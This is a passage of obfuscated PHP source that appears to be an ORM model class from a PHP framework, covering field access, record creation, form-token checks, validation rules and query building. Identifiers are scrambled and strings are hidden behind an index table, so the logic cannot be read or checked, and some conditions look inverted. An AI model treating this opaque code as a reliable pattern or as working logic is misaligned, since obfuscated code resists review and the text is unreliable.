$ìÎ»º[$×ùÈ¡Ù¸]; unset($ìÎ»º[$×ùÈ¡Ù¸]); } } } } return $ìÎ»º; } public function setField($Û¡Ï¼Ğ², $Ïßõª— = '') { if (is_array($Û¡Ï¼Ğ²)) { $íã€Í© = $Û¡Ï¼Ğ²; } else { $íã€Í©[$Û¡Ï¼Ğ²] = $Ïßõª—; } return $this->save($íã€Í©); } public function setAdd($¤ëÅ³åµ, $ü¤¹ñè = 1) { $î¨Àà­Ó =& $_SERVER[¡¬ıÜ ƒ]; $Ö¨±°ÅÊ = $¤ëÅ³åµ . $î¨Àà­Ó[373] . $ü¤¹ñè; if ($ü¤¹ñè < 0) { $Ö¨±°ÅÊ = $¤ëÅ³åµ . $ü¤¹ñè; } return $this->setField($¤ëÅ³åµ, array($î¨Àà­Ó[374], $Ö¨±°ÅÊ)); } public function getField($à¹×ÏÂû, $Æı ‚šë = null) { $§êÌ•Á =& $_SERVER[¡¬ıÜ ƒ]; $©»Ğ³Íë[$§êÌ•Á[352]] = $à¹×ÏÂû; $©»Ğ³Íë = $this->_parseOptions($©»Ğ³Íë); $à¹×ÏÂû = trim($à¹×ÏÂû); if (strpos($à¹×ÏÂû, $§êÌ•Á[50])) { if (!isset($©»Ğ³Íë[$§êÌ•Á[369]])) { $©»Ğ³Íë[$§êÌ•Á[369]] = is_numeric($Æı ‚šë) ? $Æı ‚šë : $§êÌ•Á[12]; } $²şô™‰É = $this->db->select($©»Ğ³Íë); if (!empty($²şô™‰É)) { $ü‘ôİÒ  = explode($§êÌ•Á[50], $à¹×ÏÂû); $à¹×ÏÂû = array_keys($²şô™‰É[0]); $ÑÅ‹¼Ü = array_shift($à¹×ÏÂû); $åäĞ¶© = array_shift($à¹×ÏÂû); $åˆÇó¯É = array(); $¶«Å‹İ = count($ü‘ôİÒ ); foreach ($²şô™‰É as $åé‹«ß¦) { $ë ÖšŞÌ = $åé‹«ß¦[$ÑÅ‹¼Ü]; if (2 == $¶«Å‹İ) { $åˆÇó¯É[$ë ÖšŞÌ] = $åé‹«ß¦[$åäĞ¶©]; } else { $åˆÇó¯É[$ë ÖšŞÌ] = is_string($Æı ‚šë) ? implode($Æı ‚šë, $åé‹«ß¦) : $åé‹«ß¦; } } return $åˆÇó¯É; } } else { if (!0 !== $Æı ‚šë) { $©»Ğ³Íë[$§êÌ•Á[369]] = is_numeric($Æı ‚šë) ? $Æı ‚šë : 1; } if ($Æı ‚šë === $§êÌ•Á[334]) { unset($©»Ğ³Íë[$§êÌ•Á[369]]); } $åé‹«ß¦ = $this->db->select($©»Ğ³Íë); if (!empty($åé‹«ß¦)) { if ($Æı ‚šë === $§êÌ•Á[334]) { return reset($åé‹«ß¦[0]); } if (!0 !== $Æı ‚šë && 1 == $©»Ğ³Íë[$§êÌ•Á[369]]) { return reset($åé‹«ß¦[0]); } foreach ($åé‹«ß¦ as $Ü¦œô”ß) { $Ôœ è™×[] = $Ü¦œô”ß[$à¹×ÏÂû]; } return $Ôœ è™×; } } return null; } public function create($éŞˆ‰€§ = '', $«Ü¡ƒ» = '') { $«ï‰£à =& $_SERVER[¡¬ıÜ ƒ]; if (empty($éŞˆ‰€§)) { $éŞˆ‰€§ = $_POST; } elseif (is_object($éŞˆ‰€§)) { $éŞˆ‰€§ = get_object_vars($éŞˆ‰€§); } if (empty($éŞˆ‰€§) || !is_array($éŞˆ‰€§)) { $this->error = think_lang($«ï‰£à[350]); return !1; } $éŞˆ‰€§ = $this->parseFieldsMap($éŞˆ‰€§, 0); $«Ü¡ƒ» = $«Ü¡ƒ» ? $«Ü¡ƒ» : (!empty($éŞˆ‰€§[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$«ï‰£à[352]])) { $ç¡ûü¹ = $this->options[$«ï‰£à[352]]; unset($this->options[$«ï‰£à[352]]); } elseif ($«Ü¡ƒ» == THINK_MODEL_INSERT && isset($this->insertFields)) { $ç¡ûü¹ = $this->insertFields; } elseif ($«Ü¡ƒ» == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ç¡ûü¹ = $this->updateFields; } if (isset($ç¡ûü¹)) { if (is_string($ç¡ûü¹)) { $ç¡ûü¹ = explode($«ï‰£à[50], $ç¡ûü¹); } if (think_config($«ï‰£à[375])) { $ç¡ûü¹[] = think_config($«ï‰£à[376]); } foreach ($éŞˆ‰€§ as $ë«Ÿì¢ => $ò‚ùÕÜ) { if (!in_array($ë«Ÿì¢, $ç¡ûü¹)) { unset($éŞˆ‰€§[$ë«Ÿì¢]); } } } if (!$this->autoValidation($éŞˆ‰€§, $«Ü¡ƒ»)) { return !1; } if (!$this->autoCheckToken($éŞˆ‰€§)) { $this->error = think_lang($«ï‰£à[377]); return !1; } if ($this->autoCheckFields) { $ç¡ûü¹ = $this->getDbFields(); foreach ($éŞˆ‰€§ as $ë«Ÿì¢ => $ò‚ùÕÜ) { if (!in_array($ë«Ÿì¢, $ç¡ûü¹)) { unset($éŞˆ‰€§[$ë«Ÿì¢]); } elseif (MAGIC_QUOTES_GPC && is_string($ò‚ùÕÜ)) { $éŞˆ‰€§[$ë«Ÿì¢] = stripslashes($ò‚ùÕÜ); } } } $this->autoOperation($éŞˆ‰€§, $«Ü¡ƒ»); $this->data = $éŞˆ‰€§; return $éŞˆ‰€§; } public function autoCheckToken($ƒ·Ğ¬ñğ) { $Áßêô =& $_SERVER[¡¬ıÜ ƒ]; if (isset($this->options[$Áßêô[378]]) && !$this->options[$Áßêô[378]]) { return !0; } if (think_config($Áßêô[375])) { $˜ÂÁøÃ¤ = think_config($Áßêô[376]); if (!isset($ƒ·Ğ¬ñğ[$˜ÂÁøÃ¤]) || Session::get($˜ÂÁøÃ¤)) { return !1; } list($†ªÈİ, $í…Ë²œ) = explode($Áßêô[11], $ƒ·Ğ¬ñğ[$˜ÂÁøÃ¤]); if ($í…Ë²œ && Session::get($˜ÂÁøÃ¤ . $Áßêô[10] . $†ªÈİ) === $í…Ë²œ) { Session::remove($˜ÂÁøÃ¤ . $Áßêô[10] . $†ªÈİ); return !0; } if (think_config($Áßêô[379])) { Session::remove($˜ÂÁøÃ¤ . $Áßêô[10] . $†ªÈİ); } return !1; } return !0; } public function regex($ÒËì×Ó”, $ÍÂ±ö­¢) { $Ë¶» œõ =& $_SERVER[¡¬ıÜ ƒ]; $…ŒÅ…Ş¨ = array($Ë¶» œõ[380] => $Ë¶» œõ[381], $Ë¶» œõ[382] => $Ë¶» œõ[383], $Ë¶» œõ[384] => $Ë¶» œõ[385], $Ë¶» œõ[386] => $Ë¶» œõ[387], $Ë¶» œõ[388] => $Ë¶» œõ[389], $Ë¶» œõ[390] => $Ë¶» œõ[391], $Ë¶» œõ[392] => $Ë¶» œõ[393], $Ë¶» œõ[367] => $Ë¶» œõ[394], $Ë¶» œõ[395] => $Ë¶» œõ[396]); if (isset($…ŒÅ…Ş¨[strtolower($ÍÂ±ö­¢)])) { $ÍÂ±ö­¢ = $…ŒÅ…Ş¨[strtolower($ÍÂ±ö­¢)]; } return preg_match($ÍÂ±ö­¢, $ÒËì×Ó”) === 1; } private function autoOperation(&$ä¼µ€™‡, $ó„‚¾Á§) { $±åşï± =& $_SERVER[¡¬ıÜ ƒ]; if (!empty($this->options[$±åşï±[397]])) { $Ğª¦Ğßã = $this->options[$±åşï±[397]]; unset($this->options[$±åşï±[397]]); } elseif (!empty($this->_auto)) { $Ğª¦Ğßã = $this->_auto; } if (isset($Ğª¦Ğßã)) { foreach ($Ğª¦Ğßã as $ÜéÊã©¿) { if (empty($ÜéÊã©¿[2])) { $ÜéÊã©¿[2] = THINK_MODEL_INSERT; } if ($ó„‚¾Á§ == $ÜéÊã©¿[2] || $ÜéÊã©¿[2] == THINK_MODEL_BOTH) { switch (trim($ÜéÊã©¿[3])) { case $±åşï±[398]: case $±åşï±[399]: $´Ÿ“ÒŞ˜ = isset($ÜéÊã©¿[4]) ? (array) $ÜéÊã©¿[4] : array(); if (isset($ä¼µ€™‡[$ÜéÊã©¿[0]])) { array_unshift($´Ÿ“ÒŞ˜, $ä¼µ€™‡[$ÜéÊã©¿[0]]); } if ($±åşï±[398] == $ÜéÊã©¿[3]) { $ä¼µ€™‡[$ÜéÊã©¿[0]] = call_user_func_array($ÜéÊã©¿[1], $´Ÿ“ÒŞ˜); } else { $ä¼µ€™‡[$ÜéÊã©¿[0]] = call_user_func_array(array(&$this, $ÜéÊã©¿[1]), $´Ÿ“ÒŞ˜); } break; case $±åşï±[352]: $ä¼µ€™‡[$ÜéÊã©¿[0]] = $ä¼µ€™‡[$ÜéÊã©¿[1]]; break; case $±åşï±[400]: if ($±åşï±[12] === $ä¼µ€™‡[$ÜéÊã©¿[0]]) { unset($ä¼µ€™‡[$ÜéÊã©¿[0]]); } break; case $±åşï±[401]: default: $ä¼µ€™‡[$ÜéÊã©¿[0]] = $ÜéÊã©¿[1]; } if (!1 === $ä¼µ€™‡[$ÜéÊã©¿[0]]) { unset($ä¼µ€™‡[$ÜéÊã©¿[0]]); } } } } return $ä¼µ€™‡; } protected function autoValidation($½…³ş›‹, $›‘óÎ¯) { $¡“õı¹Í =& $_SERVER[¡¬ıÜ ƒ]; if (!empty($this->options[$¡“õı¹Í[402]])) { $ë´‰´† = $this->options[$¡“õı¹Í[402]]; unset($this->options[$¡“õı¹Í[402]]); } elseif (!empty($this->_validate)) { $ë´‰´† = $this->_validate; } if (isset($ë´‰´†)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ë´‰´† as $õ‡ÙéÅö => $¡¡Ê±) { if (empty($¡¡Ê±[5]) || $¡¡Ê±[5] == THINK_MODEL_BOTH || $¡¡Ê±[5] == $›‘óÎ¯) { if (0 == strpos($¡¡Ê±[2], $¡“õı¹Í[403]) && strpos($¡¡Ê±[2], $¡“õı¹Í[404])) { $¡¡Ê±[2] = think_lang(substr($¡¡Ê±[2], 2, -1)); } $¡¡Ê±[3] = isset($¡¡Ê±[3]) ? $¡¡Ê±[3] : THINK_EXISTS_VALIDATE; $¡¡Ê±[4] = isset($¡¡Ê±[4]) ? $¡¡Ê±[4] : $¡“õı¹Í[405]; switch ($¡¡Ê±[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($½…³ş›‹, $¡¡Ê±)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($¡“õı¹Í[12] != trim($½…³ş›‹[$¡¡Ê±[0]])) { if (!1 === $this->_validationField($½…³ş›‹, $¡¡Ê±)) { return !1; } } break; default: if (isset($½…³ş›‹[$¡¡Ê±[0]])) { if (!1 === $this->_validationField($½…³ş›‹, $¡¡Ê±)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ Êô¯½², $ÖÀµì˜ä) { if (!1 === $this->_validationFieldItem($ Êô¯½², $ÖÀµì˜ä)) { if ($this->patchValidate) { $this->error[$ÖÀµì˜ä[0]] = $ÖÀµì˜ä[2]; } else { $this->error = $ÖÀµì˜ä[2]; return !1; } } return; } protected function _validationFieldItem($®´›â…„, $ÓÜÊó’ä) { $œı§û´Ä =& $_SERVER[¡¬ıÜ ƒ]; switch (strtolower(trim($ÓÜÊó’ä[4]))) { case $œı§û´Ä[398]: case $œı§û´Ä[399]: $ÀÂœ†¯ = isset($ÓÜÊó’ä[6]) ? (array) $ÓÜÊó’ä[6] : array(); if (is_string($ÓÜÊó’ä[0]) && strpos($ÓÜÊó’ä[0], $œı§û´Ä[50])) { $ÓÜÊó’ä[0] = explode($œı§û´Ä[50], $ÓÜÊó’ä[0]); } if (is_array($ÓÜÊó’ä[0])) { foreach ($ÓÜÊó’ä[0] as $ÂÕ¶Ùõ‘) { $ôÛ÷‘÷[$ÂÕ¶Ùõ‘] = $®´›â…„[$ÂÕ¶Ùõ‘]; } array_unshift($ÀÂœ†¯, $ôÛ÷‘÷); } else { array_unshift($ÀÂœ†¯, $®´›â…„[$ÓÜÊó’ä[0]]); } if ($œı§û´Ä[398] == $ÓÜÊó’ä[4]) { return call_user_func_array($ÓÜÊó’ä[1], $ÀÂœ†¯); } else { return call_user_func_array(array(&$this, $ÓÜÊó’ä[1]), $ÀÂœ†¯); } case $œı§û´Ä[406]: return $®´›â…„[$ÓÜÊó’ä[0]] == $®´›â…„[$ÓÜÊó’ä[1]]; case $œı§û´Ä[407]: if (is_string($ÓÜÊó’ä[0]) && strpos($ÓÜÊó’ä[0], $œı§û´Ä[50])) { $ÓÜÊó’ä[0] = explode($œı§û´Ä[50], $ÓÜÊó’ä[0]); } $µ°ŠÈº“ = array(); if (is_array($ÓÜÊó’ä[0])) { foreach ($ÓÜÊó’ä[0] as $ÂÕ¶Ùõ‘) { $µ°ŠÈº“[$ÂÕ¶Ùõ‘] = $®´›â…„[$ÂÕ¶Ùõ‘]; } } else { $µ°ŠÈº“[$ÓÜÊó’ä[0]] = $®´›â…„[$ÓÜÊó’ä[0]]; } if (!empty($®´›â…„[$this->getPk()])) { $µ°ŠÈº“[$this->getPk()] = array($œı§û´Ä[408], $®´›â…„[$this->getPk()]); } if ($this->where($µ°ŠÈº“)->find()) { return !1; } return !0; default: return $this->check($®´›â…„[$ÓÜÊó’ä[0]], $ÓÜÊó’ä[1], $ÓÜÊó’ä[4]); } } public function check($Î¦¼³Ú, $ø™°Ï¨, $‘¥¡×‘ú = "\162\145\x67\x65\x78") { $ß¼Õ•£¼ =& $_SERVER[¡¬ıÜ ƒ]; $‘¥¡×‘ú = strtolower(trim($‘¥¡×‘ú)); switch ($‘¥¡×‘ú) { case $ß¼Õ•£¼[7]: case $ß¼Õ•£¼[409]: $øƒéÎş = is_array($ø™°Ï¨) ? $ø™°Ï¨ : explode($ß¼Õ•£¼[50], $ø™°Ï¨); return $‘¥¡×‘ú == $ß¼Õ•£¼[7] ? in_array($Î¦¼³Ú, $øƒéÎş) : !in_array($Î¦¼³Ú, $øƒéÎş); case $ß¼Õ•£¼[410]: case $ß¼Õ•£¼[411]: if (is_array($ø™°Ï¨)) { $‡Ü—»àŠ = $ø™°Ï¨[0]; $òÕ‹ô±¸ = $ø™°Ï¨[1]; } else { list($‡Ü—»àŠ, $òÕ‹ô±¸) = explode($ß¼Õ•£¼[50], $ø™°Ï¨); } return $‘¥¡×‘ú == $ß¼Õ•£¼[410] ? $Î¦¼³Ú >= $‡Ü—»àŠ && $Î¦¼³Ú <= $òÕ‹ô±¸ : $Î¦¼³Ú < $‡Ü—»àŠ || $Î¦¼³Ú > $òÕ‹ô±¸; case $ß¼Õ•£¼[412]: case $ß¼Õ•£¼[413]: return $‘¥¡×‘ú == $ß¼Õ•£¼[412] ? $Î¦¼³Ú == $ø™°Ï¨ : $Î¦¼³Ú != $ø™°Ï¨; case $ß¼Õ•£¼[414]: $½äªÕù = mb_strlen($Î¦¼³Ú, $ß¼Õ•£¼[415]); if (strpos($ø™°Ï¨, $ß¼Õ•£¼[50])) { list($‡Ü—»àŠ, $òÕ‹ô±¸) = explode($ß¼Õ•£¼[50], $ø™°Ï¨); return $½äªÕù >= $‡Ü—»àŠ && $½äªÕù <= $òÕ‹ô±¸; } else { return $½äªÕù == $ø™°Ï¨; } case $ß¼Õ•£¼[416]: list($”®ÍäÓÑ, $ûåç˜©¿) = explode($ß¼Õ•£¼[50], $ø™°Ï¨); if (!is_numeric($”®ÍäÓÑ)) { $”®ÍäÓÑ = strtotime($”®ÍäÓÑ); } if (!is_numeric($ûåç˜©¿)) { $ûåç˜©¿ = strtotime($ûåç˜©¿); } return NOW_TIME >= $”®ÍäÓÑ && NOW_TIME <= $ûåç˜©¿; case $ß¼Õ•£¼[417]: return in_array(get_client_ip(), explode($ß¼Õ•£¼[50], $ø™°Ï¨)); case $ß¼Õ•£¼[418]: return !in_array(get_client_ip(), explode($ß¼Õ•£¼[50], $ø™°Ï¨)); case $ß¼Õ•£¼[405]: default: return $this->regex($Î¦¼³Ú, $ø™°Ï¨); } } public function query($—âÌØÖœ, $Ô Á’‰ = false) { $ïıíÆ† =& $_SERVER[¡¬ıÜ ƒ]; if (!is_bool($Ô Á’‰) && !is_array($Ô Á’‰)) { $Ô Á’‰ = func_get_args(); array_shift($Ô Á’‰); } $—âÌØÖœ = str_replace(array($ïıíÆ†[287], $ïıíÆ†[419]), $ïıíÆ†[53], $—âÌØÖœ); $—âÌØÖœ = $this->parseSql($—âÌØÖœ, $Ô Á’‰); return $this->db->query($—âÌØÖœ); } public function execute($åø´’–š, $„˜À¹¾ = false) { if (!is_bool($„˜À¹¾) && !is_array($„˜À¹¾)) { $„˜À¹¾ = func_get_args(); array_shift($„˜À¹¾); } $åø´’–š = $this->parseSql($åø´’–š, $„˜À¹¾); return $this->db->execute($åø´’–š); } protected function parseSql($çŸ¶³‹Ï, $Ëƒİ±øõ) { $ÈÕß¿€« =& $_SERVER[¡¬ıÜ ƒ]; if (!0 === $Ëƒİ±øõ) { $¿Î¶ûõÓ = $this->_parseOptions(); $çŸ¶³‹Ï = $this->db->parseSql($çŸ¶³‹Ï, $¿Î¶ûõÓ); } elseif (is_array($Ëƒİ±øõ)) { $Ëƒİ±øõ = array_map(array($this->db, $ÈÕß¿€«[420]), $Ëƒİ±øõ); $çŸ¶³‹Ï = vsprintf($çŸ¶³‹Ï, $Ëƒİ±øõ); } else { $çŸ¶³‹Ï = strtr($çŸ¶³‹Ï, array($ÈÕß¿€«[421] => $this->getTableName(), $ÈÕß¿€«[422] => think_config($ÈÕß¿€«[323]))); } $this->db->setModel($this->name); return $çŸ¶³‹Ï; } public function db($Ÿœ÷˜ºÁ = '', $æâê›ô¹ = '', $’ˆòÙ¼ = array()) { $ÂıÏÓµÕ =& $_SERVER[¡¬ıÜ ƒ]; if ($ÂıÏÓµÕ[12] === $Ÿœ÷˜ºÁ && $this->db) { return $this->db; } static $øêå×Ê = array(); static $¥‚„øë² = array(); if (!isset($¥‚„øë²[$Ÿœ÷˜ºÁ]) || isset($¥‚„øë²[$Ÿœ÷˜ºÁ]) && $æâê›ô¹ && $øêå×Ê[$Ÿœ÷˜ºÁ] != $æâê›ô¹) { if (!empty($æâê›ô¹) && is_string($æâê›ô¹) && !1 === strpos($æâê›ô¹, $ÂıÏÓµÕ[8])) { $æâê›ô¹ = think_config($æâê›ô¹); } $Ÿœ÷˜ºÁ = think_guid($æâê›ô¹); $¥‚„øë²[$Ÿœ÷˜ºÁ] = Db::getInstance($æâê›ô¹); } elseif (NULL === $æâê›ô¹) { $¥‚„øë²[$Ÿœ÷˜ºÁ]->close(); unset($¥‚„øë²[$Ÿœ÷˜ºÁ]); return; } if (!empty($’ˆòÙ¼)) { if (is_string($’ˆòÙ¼)) { parse_str($’ˆòÙ¼, $’ˆòÙ¼); } foreach ($’ˆòÙ¼ as $ÛºÕªƒœ => $¹ö«´´) { $this->setProperty($ÛºÕªƒœ, $¹ö«´´); } } $øêå×Ê[$Ÿœ÷˜ºÁ] = $æâê›ô¹; $this->db = $¥‚„øë²[$Ÿœ÷˜ºÁ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $†ù¨İôÅ = get_class($this); if ($†ù¨İôÅ == $_SERVER[¡¬ıÜ ƒ][423]) { return $this->name; } $this->name = substr($†ù¨İôÅ, 0, -5); } return $this->name; } public function getTableName() { $¶·‹‡È¬ =& $_SERVER[¡¬ıÜ ƒ]; if (empty($this->trueTableName)) { $Ã¶Æ·© = !empty($this->tablePrefix) ? $this->tablePrefix : $¶·‹‡È¬[12]; if (!empty($this->tableName)) { $Ã¶Æ·© .= $this->tableName; } else { $Ã¶Æ·© .= think_parse_name($this->name); } $this->trueTableName = strtolower($Ã¶Æ·©); } return (!empty($this->dbName) ? $this->dbName . $¶·‹‡È¬[10] : $¶·‹‡È¬[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Ÿ¢ÖÍğ¿ =& $_SERVER[¡¬ıÜ ƒ]; return isset($this->fields[$Ÿ¢ÖÍğ¿[330]]) ? $this->fields[$Ÿ¢ÖÍğ¿[330]] : $this->pk; } public function getDbFields() { $„òÅšòß =& $_SERVER[¡¬ıÜ ƒ]; if (isset($this->options[$„òÅšòß[358]])) { $ö¸¾Üà‚ = $this->db->getFields($this->options[$„òÅšòß[358]]); return $ö¸¾Üà‚ ? array_keys($ö¸¾Üà‚) : !1; } if ($this->fields) { $ö¸¾Üà‚ = $this->fields; unset($ö¸¾Üà‚[$„òÅšòß[329]], $ö¸¾Üà‚[$„òÅšòß[330]], $ö¸¾Üà‚[$„òÅšòß[331]], $ö¸¾Üà‚[$„òÅšòß[328]]); return $ö¸¾Üà‚; } return !1; } public function data($™ıÊ§– = '') { $“úÔ¿œ¼ =& $_SERVER[¡¬ıÜ ƒ]; if ($“úÔ¿œ¼[12] === $™ıÊ§– && !empty($this->data)) { return $this->data; } if (is_object($™ıÊ§–)) { $™ıÊ§– = get_object_vars($™ıÊ§–); } elseif (is_string($™ıÊ§–)) { parse_str($™ıÊ§–, $™ıÊ§–); } elseif (!is_array($™ıÊ§–)) { think_exception(think_lang($“úÔ¿œ¼[350])); } $this->data = $™ıÊ§–; return $this; } public function join($§Ë÷ˆ ) { $•ÌÎİ›Î =& $_SERVER[¡¬ıÜ ƒ]; if (is_array($§Ë÷ˆ )) { $this->options[$•ÌÎİ›Î[361]] = $§Ë÷ˆ ; } elseif (!empty($§Ë÷ˆ )) { $this->options[$•ÌÎİ›Î[361]][] = $§Ë÷ˆ ; } return $this; } public function union($ÇçŞ¦æ , $İ‚ÑÅÛ = false) { $²öÁ›ë =& $_SERVER[¡¬ıÜ ƒ]; if (empty($ÇçŞ¦æ )) { return $this; } if ($İ‚ÑÅÛ) { $this->options[$²öÁ›ë[424]][$²öÁ›ë[425]] = !0; } if (is_object($ÇçŞ¦æ )) { $ÇçŞ¦æ  = get_object_vars($ÇçŞ¦æ ); } if (is_string($ÇçŞ¦æ )) { $¨™ƒƒøı = $ÇçŞ¦æ ; } elseif (is_array($ÇçŞ¦æ )) { if (isset($ÇçŞ¦æ [0])) { $this->options[$²öÁ›ë[424]] = array_merge($this->options[$²öÁ›ë[424]], $ÇçŞ¦æ ); return $this; } else { $¨™ƒƒøı = $ÇçŞ¦æ ; } } else { think_exception(think_lang($²öÁ›ë[350])); } $this->options[$²öÁ›ë[424]][] = $¨™ƒƒøı; return $this; } public function cache($ÊÖ¸À £ = true, $µŒë‚ø  = null, $É³ì·ı = '') { $Â¢ûåš =& $_SERVER[¡¬ıÜ ƒ]; if (!1 !== $ÊÖ¸À £) { $this->options[$Â¢ûåš[426]] = array($Â¢ûåš[97] => $ÊÖ¸À £, $Â¢ûåš[416] => $µŒë‚ø , $Â¢ûåš[33] => $É³ì·ı); } return $this; } public function field($äµşÀÁÙ, $êÙ˜Ôø‰ = false) { $ú¥¤ïºä =& $_SERVER[¡¬ıÜ ƒ]; if (!0 === $äµşÀÁÙ) { $îÂ•ÓŞó = $this->getDbFields(); $äµşÀÁÙ = $îÂ•ÓŞó ? $îÂ•ÓŞó : $ú¥¤ïºä[222]; } elseif ($êÙ˜Ôø‰) { if (is_string($äµşÀÁÙ)) { $äµşÀÁÙ = explode($ú¥¤ïºä[50], $äµşÀÁÙ); } $îÂ•ÓŞó = $this->getDbFields(); $äµşÀÁÙ = $îÂ•ÓŞó ? array_diff($îÂ•ÓŞó, $äµşÀÁÙ) : $äµşÀÁÙ; } $this->options[$ú¥¤ïºä[352]] = $äµşÀÁÙ; return $this; } public function scope($ì÷§ã¤— = '', $İƒü§Ÿ› = NULL) { $Ü›¦¸ô =& $_SERVER[¡¬ıÜ ƒ]; if ($Ü›¦¸ô[12] === $ì÷§ã¤—) { if (isset($this->_scope[$Ü›¦¸ô[37]])) { $ŸïüÙ = $this->_scope[$Ü›¦¸ô[37]]; } else { return $this; } } elseif (is_string($ì÷§ã¤—)) { $êÃ–Ì›Û = explode($Ü›¦¸ô[50], $ì÷§ã¤—); $ŸïüÙ = array(); foreach ($êÃ–Ì›Û as $¢Ğûï‰£) { if (!isset($this->_scope[$¢Ğûï‰£])) { continue; } $ŸïüÙ = array_merge($ŸïüÙ, $this->_scope[$¢Ğûï‰£]); } if (!empty($İƒü§Ÿ›) && is_array($İƒü§Ÿ›)) { $ŸïüÙ = array_merge($ŸïüÙ, $İƒü§Ÿ›); } } elseif (is_array($ì÷§ã¤—)) { $ŸïüÙ = $ì÷§ã¤—; } if (is_array($ŸïüÙ) && !empty($ŸïüÙ)) { $this->options = array_merge($this->options, array_change_key_case($ŸïüÙ)); } return $this; } public function where($“‹“íÀê, $Å’áİàò = null) { $¬›ÈŸ¾ã =& $_SERVER[¡¬ıÜ ƒ]; if (!is_null($Å’áİàò) && is_string($“‹“íÀê)) { if (!is_array($Å’áİàò)) { $Å’áİàò = func_get_args(); array_shift($Å’áİàò); } $Å’áİàò = array_map(array($this->db, $¬›ÈŸ¾ã[420]), $Å’áİàò); $“‹“íÀê = vsprintf($“‹“íÀê, $Å’áİàò); } elseif (is_object($“‹“íÀê)) { $“‹“íÀê = get_object_vars($“‹“íÀê); } elseif (is_array($“‹“íÀê)) { foreach ($“‹“íÀê as $—ëéôá => $ÊÉ÷ÈÈ¡) { if ((is_numeric($—ëéôá) || !$—ëéôá) && is_string($ÊÉ÷ÈÈ¡)) { if (strpos($ÊÉ÷ÈÈ¡, $¬›ÈŸ¾ã[427]) === 0) { continue; } think_trace($¬›ÈŸ¾ã[428], $¬›ÈŸ¾ã[12], $¬›ÈŸ¾ã[49]); die; } } } if (is_string($“‹“íÀê) && $¬›ÈŸ¾ã[12] != $“‹“íÀê) { $…ù·…ú£ = array(); $…ù·…ú£[$¬›ÈŸ¾ã[429]] = $“‹“íÀê; $“‹“íÀê = $…ù·…ú£; } if (isset($this->options[$¬›ÈŸ¾ã[354]])) { $this->options[$¬›ÈŸ¾ã[354]] = array_merge($this->options[$¬›ÈŸ¾ã[354]], $“‹“íÀê); } else { $this->options[$¬›ÈŸ¾ã[354]] = $“‹“íÀê; } return $this; } public function limit($Àëèµ’ñ, $„ÈÌÈù = null) { $õ‹»ÄÂ£ =& $_SERVER[¡¬ıÜ ƒ]; $this->options[$õ‹»ÄÂ£[369]] = is_null($„ÈÌÈù) ? $Àëèµ’ñ : $Àëèµ’ñ . $õ‹»ÄÂ£[50] . $„ÈÌÈù; return $this; } public function page($Ÿ˜õ¢âŒ, $Ê£ä¿‡Ú = null) { $•µ‡­ ‰ =& $_SERVER[¡¬ıÜ ƒ]; $this->options[$•µ‡­ ‰[430]] = is_null($Ê£ä¿‡Ú) ? $Ÿ˜õ¢âŒ : $Ÿ˜õ¢âŒ . $•µ‡­ ‰[50] . $Ê£ä¿‡Ú; return $this; } public function comment($ë¨êø‘) { $this->options[$_SERVER[¡¬ıÜ ƒ][431]] = $ë¨êø‘; return $this; } public function setProperty($Ü¹Øµè”, $Ÿ’³‚¤Å) { if (property_exists($this, $Ü¹Øµè”)) { $this->{$Ü¹Øµè”} = $Ÿ’³‚¤Å; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\171\124\x69\155\x65", "\x74\151\x6d\x65", "\x69\156\x73\145\x72\x74\54\x75\x70\x64\x61\164\x65", "\x66\165\156\143\164\x69\x6f\156"), array("\143\x72\x65\x61\x74\145\x54\x69\x6d\x65", "\164\151\155\x65", "\x69\156\163\145\x72\x74", "\146\165\x6e\x63\x74\151\157\x6e")); public function setDataAuto($‡ç«·ûü) { $this->dataAuto = $‡ç«·ûü; } public function __construct($®ÕÉé®  = '', $¾“îï‚ = '', $¥†Šº¿¡ = '') { parent::__construct($®ÕÉé® , $¾“îï‚, $¥†Šº¿¡); } protected $tableMeta = array(); protected function _beforeInsert(&$ÍÓ÷¤ÄÃ, $Ô¤íÔíô) { $Øûö„ö =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->checkDataAutoHas($Øûö„ö[432])) { return; } $this->dataBeforeFilter($ÍÓ÷¤ÄÃ, $Øûö„ö[432]); } protected function _beforeUpdate(&$Ö¯ÎÒ, $’©Ô©Åé) { $¨ÔÂî¢ =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->checkDataAutoHas($¨ÔÂî¢[433])) { return; } $this->dataBeforeFilter($Ö¯ÎÒ, $¨ÔÂî¢[433]); } protected function _afterSelect(&$ñ¦˜Î×„, $¼ùÈ‚Ãë) { if (!is_array($ñ¦˜Î×„)) { return; } if (!$this->checkDataAutoHas($_SERVER[¡¬ıÜ ƒ][434])) { return; } foreach ($ñ¦˜Î×„ as &$ßÊ­¢î“) { $this->dataAfterFilter($ßÊ­¢î“); } unset($ßÊ­¢î“); } protected function _afterFind(&$Õ²á”îû, $¹ú˜Ô›µ) { if (!is_array($Õ²á”îû)) { return; } if (!$this->checkDataAutoHas($_SERVER[¡¬ıÜ ƒ][434])) { return; } $this->dataAfterFilter($Õ²á”îû); } public static function textEncode($ËØì¹·Ò) { if (!$ËØì¹·Ò) { return $ËØì¹·Ò; } $ÛÍÑĞ„ = json_encode($ËØì¹·Ò); $ÛÍÑĞ„ = preg_replace_callback($_SERVER[¡¬ıÜ ƒ][435], function ($†ÕöòÉÃ) { return addslashes($†ÕöòÉÃ[0]); }, $ÛÍÑĞ„); return json_decode($ÛÍÑĞ„); } public static function textDecode($›—¨›) { $ æüèïİ =& $_SERVER[¡¬ıÜ ƒ]; $»Ó®€ëä 